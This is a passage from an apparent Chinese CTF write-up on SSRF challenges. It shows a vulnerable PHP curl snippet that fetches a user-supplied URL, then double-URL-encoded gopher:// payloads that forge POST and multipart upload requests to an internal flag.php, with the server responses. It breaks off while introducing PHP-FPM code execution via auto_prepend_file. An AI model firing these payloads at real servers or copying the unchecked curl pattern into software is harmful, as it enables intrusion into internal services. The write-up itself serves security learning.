+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">    //不存在就跳转到当前根目录</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">    header</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">Location: /?url=_</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">    exit</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//初始化curl</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#998418;--shiki-dark:#B8A965"> curl_init</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//指定请求的url</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">curl_setopt</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#A65E2B;--shiki-dark:#C99076"> CURLOPT_URL</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">_REQUEST</span><span style="color:#1e754f;--shiki-dark:#4d9375">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">url</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#1e754f;--shiki-dark:#4d9375">]</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//告诉curl不返回http头，只返回http正文</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">curl_setopt</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#A65E2B;--shiki-dark:#C99076"> CURLOPT_HEADER</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//允许cURL跟随重定向。如果服务器响应包含重定向，cURL将自动处理。</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">curl_setopt</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#A65E2B;--shiki-dark:#C99076"> CURLOPT_FOLLOWLOCATION</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 1</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">curl_exec</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">curl_close</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span></code></pre>
+<p>这段代码没有包含错误处理，也没有设置<code>CURLOPT_RETURNTRANSFER</code>选项，这可能导致cURL的输出直接被输出到浏览器，所以可以利用此curl漏洞进行攻击</p>
+<p>看样子我们需要使用POST提交一串key到内网的/flag.php中，那么我们可以采用gopher协议，首先构造POST包：</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/%E5%8C%85.png" class="" title="包"></p>
+<p>我们构造一下我们需要的内容：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /flag.php HTTP/1.1</span></span>
+<span class="line"><span>Host: 127.0.0.1</span></span>
+<span class="line"><span>Content-Type: application/x-www-form-urlencoded</span></span>
+<span class="line"><span>Content-Length: 36</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>key=49719164264cb75cf9f7de397bdbe95e</span></span></code></pre>
+<p>URL编码之后加上%0d%0a：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%50%4f%53%54%20%2f%66%6c%61%67%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%33%36%0a%0a%6b%65%79%3d%34%39%37%31%39%31%36%34%32%36%34%63%62%37%35%63%66%39%66%37%64%65%33%39%37%62%64%62%65%39%35%65%0d%0a</span></span></code></pre>
+<p>这里如果我们直接传入的话会看不到任何内容，这是由于 <strong>在向服务器发送请求时，首先浏览器会进行一次URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次解码。</strong></p>
+<p>而如果我们仅仅进行了二次编码传入：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%36%25%30%61%25%30%61%25%36%62%25%36%35%25%37%39%25%33%64%25%33%34%25%33%39%25%33%37%25%33%31%25%33%39%25%33%31%25%33%36%25%33%34%25%33%32%25%33%36%25%33%34%25%36%33%25%36%32%25%33%37%25%33%35%25%36%33%25%36%36%25%33%39%25%36%36%25%33%37%25%36%34%25%36%35%25%33%33%25%33%39%25%33%37%25%36%32%25%36%34%25%36%32%25%36%35%25%33%39%25%33%35%25%36%35%25%30%64%25%30%61</span></span></code></pre>
+<p>这个内容传进去会显示400 bad reqest，这是因为%0A是<strong>ASCII</strong> 码中的换行符，在URL的二次编码中不需要，否则会导致curl执行错误，导致我们拿不到正确的结果，所以我们在第一次URL编码之后需要将%0a替换为%0d%0a，也就是：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%50%4f%53%54%20%2f%66%6c%61%67%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%33%36%0d%0a%0d%0a%6b%65%79%3d%34%39%37%31%39%31%36%34%32%36%34%63%62%37%35%63%66%39%66%37%64%65%33%39%37%62%64%62%65%39%35%65%0d%0d%0a</span></span></code></pre>
+<p>对这串内容进行二次URL编码;</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%36%25%30%64%25%30%61%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%33%64%25%33%34%25%33%39%25%33%37%25%33%31%25%33%39%25%33%31%25%33%36%25%33%34%25%33%32%25%33%36%25%33%34%25%36%33%25%36%32%25%33%37%25%33%35%25%36%33%25%36%36%25%33%39%25%36%36%25%33%37%25%36%34%25%36%35%25%33%33%25%33%39%25%33%37%25%36%32%25%36%34%25%36%32%25%36%35%25%33%39%25%33%35%25%36%35%25%30%64%25%30%64%25%30%61</span></span></code></pre>
+<p>将这串内容用/?url=gopher://127.0.0.1:80/_上传之后用view-source:我们能看到如下内容：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>HTTP/1.1 200 OK</span></span>
+<span class="line"><span>Date: Wed, 11 Feb 2026 14:06:43 GMT</span></span>
+<span class="line"><span>Server: Apache/2.4.25 (Debian)</span></span>
+<span class="line"><span>X-Powered-By: PHP/5.6.40</span></span>
+<span class="line"><span>Content-Length: 32</span></span>
+<span class="line"><span>Content-Type: text/html; charset=UTF-8</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>ctfhub&#123;6165f2f6eb7f2fae1736f63b&#125;HTTP/1.1 400 Bad Request</span></span>
+<span class="line"><span>Date: Wed, 11 Feb 2026 14:06:43 GMT</span></span>
+<span class="line"><span>Server: Apache/2.4.25 (Debian)</span></span>
+<span class="line"><span>Content-Length: 306</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Type: text/html; charset=iso-8859-1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#x3C;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"></span></span>
+<span class="line"><span>&#x3C;html>&#x3C;head></span></span>
+<span class="line"><span>&#x3C;title>400 Bad Request&#x3C;/title></span></span>
+<span class="line"><span>&#x3C;/head>&#x3C;body></span></span>
+<span class="line"><span>&#x3C;h1>Bad Request&#x3C;/h1></span></span>
+<span class="line"><span>&#x3C;p>Your browser sent a request that this server could not understand.&#x3C;br /></span></span>
+<span class="line"><span>&#x3C;/p></span></span>
+<span class="line"><span>&#x3C;hr></span></span>
+<span class="line"><span>&#x3C;address>Apache/2.4.25 (Debian) Server at 10.233.122.237 Port 80&#x3C;/address></span></span>
+<span class="line"><span>&#x3C;/body>&#x3C;/html></span></span></code></pre>
+<p>奇怪，明明flag都出来结尾还有一个400，这里我猜测应该是我们在第一次URL编码之后加上了%0d%0a的原因，或许服务器在收到请求对我们的GET参数解码之后会在调用curl之前在末尾添加上%0d%0a，那么这就意味着结尾重复出现了%0d%0a，如果我们试着删除添加的%0d%0a呢？也就是：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%50%4f%53%54%20%2f%66%6c%61%67%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%33%36%0d%0a%0d%0a%6b%65%79%3d%34%39%37%31%39%31%36%34%32%36%34%63%62%37%35%63%66%39%66%37%64%65%33%39%37%62%64%62%65%39%35%65</span><span>  //%0a替换为%0d%0a之后</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%36%25%30%64%25%30%61%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%33%64%25%33%34%25%33%39%25%33%37%25%33%31%25%33%39%25%33%31%25%33%36%25%33%34%25%33%32%25%33%36%25%33%34%25%36%33%25%36%32%25%33%37%25%33%35%25%36%33%25%36%36%25%33%39%25%36%36%25%33%37%25%36%34%25%36%35%25%33%33%25%33%39%25%33%37%25%36%32%25%36%34%25%36%32%25%36%35%25%33%39%25%33%35%25%36%35</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/succ.png" class="" title="succ"></p>
+<p>果然，这次没有再显示400了</p>
+<h3 id="上传文件"><a class="anchor" href="#上传文件">#</a> 上传文件：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>这次需要上传一个文件到flag.php了.祝你好运</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/%E4%B8%8A%E4%BC%A0.png" class="" title="上传"></p>
+<p>我们试着直接访问<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%EF%BC%8C%E8%AE%A9%E6%88%91%E4%BB%AC%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%8F%AF%E6%98%AF%E6%B2%A1%E6%9C%89%E4%B8%8A%E4%BC%A0%E6%8C%89%E9%92%AE%EF%BC%8C%E5%8F%AA%E5%A5%BD%E6%89%8B%E5%8A%A8%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E4%BA%86%EF%BC%9A">http://127.0.0.1/flag.php，让我们上传文件可是没有上传按钮，只好手动添加一个了：</a></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-html"><span class="line"><span style="color:#999999;--shiki-dark:#666666">&#x3C;</span><span style="color:#1E754F;--shiki-dark:#4D9375">input</span><span style="color:#B07D48;--shiki-dark:#BD976A"> type</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">submit</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B07D48;--shiki-dark:#BD976A"> name</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">submit</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">></span></span></code></pre>
+<p>将这段代码添加到前端代码中，并且随便上传一个文件，显示：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Just View From 127.0.0.1</span></span></code></pre>
+<p>我们抓一下上传文件的包：</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/%E4%B8%8A%E4%BC%A02.png" class="" title="上传 2"></p>
+<p>那么我们再次构造一下POST请求：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /flag.php HTTP/1.1</span></span>
+<span class="line"><span>Host: 127.0.0.1</span></span>
+<span class="line"><span>Content-Type: multipart/form-data; boundary=----geckoformboundary7b8228c49e52730cc0c78876fb212042</span></span>
+<span class="line"><span>Content-Length: 343</span></span>
+<span class="line"><span>/*ZLARYY(我是标记)*/</span></span>
+<span class="line"><span>------geckoformboundary7b8228c49e52730cc0c78876fb212042</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="file"; filename="test.txt"</span></span>
+<span class="line"><span>Content-Type: text/plain</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>SSRF Upload</span></span>
+<span class="line"><span>------geckoformboundary7b8228c49e52730cc0c78876fb212042</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="submit"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>提交查询</span></span>
+<span class="line"><span>------geckoformboundary7b8228c49e52730cc0c78876fb212042--</span></span></code></pre>
+<p><strong>注意：在构造的时候，Content-Length表示HTTP请求中空行之后的所有内容的字节数，所以标记位置一定中间要有空行</strong></p>
+<p>这里就不废话了，直接给出最后的payload：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>gopher://127.0.0.1:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%64%25%37%35%25%36%63%25%37%34%25%36%39%25%37%30%25%36%31%25%37%32%25%37%34%25%32%66%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%64%25%32%64%25%32%64%25%32%64%25%32%64%25%36%37%25%36%35%25%36%33%25%36%62%25%36%66%25%36%36%25%36%66%25%37%32%25%36%64%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%37%25%36%32%25%33%38%25%33%32%25%33%32%25%33%38%25%36%33%25%33%34%25%33%39%25%36%35%25%33%35%25%33%32%25%33%37%25%33%33%25%33%30%25%36%33%25%36%33%25%33%30%25%36%33%25%33%37%25%33%38%25%33%38%25%33%37%25%33%36%25%36%36%25%36%32%25%33%32%25%33%31%25%33%32%25%33%30%25%33%34%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%34%25%33%33%25%30%64%25%30%61%25%30%64%25%30%61%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%36%37%25%36%35%25%36%33%25%36%62%25%36%66%25%36%36%25%36%66%25%37%32%25%36%64%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%37%25%36%32%25%33%38%25%33%32%25%33%32%25%33%38%25%36%33%25%33%34%25%33%39%25%36%35%25%33%35%25%33%32%25%33%37%25%33%33%25%33%30%25%36%33%25%36%33%25%33%30%25%36%33%25%33%37%25%33%38%25%33%38%25%33%37%25%33%36%25%36%36%25%36%32%25%33%32%25%33%31%25%33%32%25%33%30%25%33%34%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%34%25%36%39%25%37%33%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%36%36%25%36%39%25%36%63%25%36%35%25%32%32%25%33%62%25%32%30%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%37%34%25%36%35%25%37%33%25%37%34%25%32%65%25%37%34%25%37%38%25%37%34%25%32%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%37%30%25%36%63%25%36%31%25%36%39%25%36%65%25%30%64%25%30%61%25%30%64%25%30%61%25%35%33%25%35%33%25%35%32%25%34%36%25%32%30%25%35%35%25%37%30%25%36%63%25%36%66%25%36%31%25%36%34%25%30%64%25%30%61%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%36%37%25%36%35%25%36%33%25%36%62%25%36%66%25%36%36%25%36%66%25%37%32%25%36%64%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%37%25%36%32%25%33%38%25%33%32%25%33%32%25%33%38%25%36%33%25%33%34%25%33%39%25%36%35%25%33%35%25%33%32%25%33%37%25%33%33%25%33%30%25%36%33%25%36%33%25%33%30%25%36%33%25%33%37%25%33%38%25%33%38%25%33%37%25%33%36%25%36%36%25%36%32%25%33%32%25%33%31%25%33%32%25%33%30%25%33%34%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%34%25%36%39%25%37%33%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%37%33%25%37%35%25%36%32%25%36%64%25%36%39%25%37%34%25%32%32%25%30%64%25%30%61%25%30%64%25%30%61%25%64%30%25%61%34%25%65%35%25%65%32%25%30%64%25%30%61%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%36%37%25%36%35%25%36%33%25%36%62%25%36%66%25%36%36%25%36%66%25%37%32%25%36%64%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%37%25%36%32%25%33%38%25%33%32%25%33%32%25%33%38%25%36%33%25%33%34%25%33%39%25%36%35%25%33%35%25%33%32%25%33%37%25%33%33%25%33%30%25%36%33%25%36%33%25%33%30%25%36%33%25%33%37%25%33%38%25%33%38%25%33%37%25%33%36%25%36%36%25%36%32%25%33%32%25%33%31%25%33%32%25%33%30%25%33%34%25%33%32%25%32%64%25%32%64</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/succe.png" class="" title="succe"></p>
+<h3 id="fastcgi协议"><a class="anchor" href="#fastcgi协议">#</a> FastCGI协议：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</span></span></code></pre>
+<p>附件地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写_flower未授权-CSDN博客</a></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/try.png" class="" title="try"></p>
+<p>我们尝试直接访问显示404，之后尝试用file读取/flag.php和/var/www/html/flag.php都没有结果。</p>
+<p>根据前面的文章我们重点看最后的任意代码执行部分：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</span></span>
+<span class="line"><span></span></span>
